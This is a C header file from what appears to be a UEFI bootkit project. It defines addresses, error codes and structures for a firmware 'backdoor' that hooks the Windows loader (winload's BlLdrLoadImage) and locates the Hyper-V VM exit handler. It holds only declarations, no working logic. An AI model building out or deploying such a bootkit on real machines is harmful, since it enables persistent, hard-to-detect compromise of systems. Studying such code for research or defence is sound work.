
#ifndef _BOOT_BACKDOOR_H_
#define _BOOT_BACKDOOR_H_

#pragma warning(disable: 4200)

// physical address where DXE driver will be loaded
#define BACKDOOR_ADDR 0x10000

#define BACKDOOR_NOT_READY  0
#define BACKDOOR_SUCCESS    1

// error codes
#define BACKDOOR_ERR_UNKNOWN        ((UINT64)-1) // unkown error
#define BACKDOOR_ERR_WINLOAD_IMAGE  ((UINT64)-2) // winload image not found
#define BACKDOOR_ERR_WINLOAD_FUNC   ((UINT64)-3) // winload!BlLdrLoadImage() not found
#define BACKDOOR_ERR_WINLOAD_HOOK   ((UINT64)-4) // winload hook error
#define BACKDOOR_ERR_HYPER_V_IMAGE  ((UINT64)-5) // Hyper-V image not found
#define BACKDOOR_ERR_HYPER_V_EXIT   ((UINT64)-6) // Hyper-V VM exit handler not found

#pragma pack(1)

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryInfected;
    UINT64 LocateProtocol;
    UINT64 SystemTable;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

typedef struct _INFECTOR_STATUS
{
    UINT64 Status;
    UINT64 Unused;

} INFECTOR_STATUS,
*PINFECTOR_STATUS;

typedef struct _HYPER_V_INFO
{
    UINT64 Status;
    VOID *ImageBase;
    VOID *ImageEntry;
    VOID *VmExit;

} HYPER_V_INFO,
*PHYPER_V_INFO;

#pragma pack()

// physical address of INFECTOR_STATUS
#define INFECTOR_STATUS_ADDR (PAGE_SIZE - sizeof(INFECTOR_STATUS))

// physical address of HYPER_V_INFO
#define HYPER_V_INFO_ADDR (INFECTOR_STATUS_ADDR - sizeof(HYPER_V_INFO))

// debug messages buffer pointer address
#define DEBUG_OUTPUT_ADDR (HYPER_V_INFO_ADDR - sizeof(UINT64))

void ConsolePrint(char *Message);

#endif
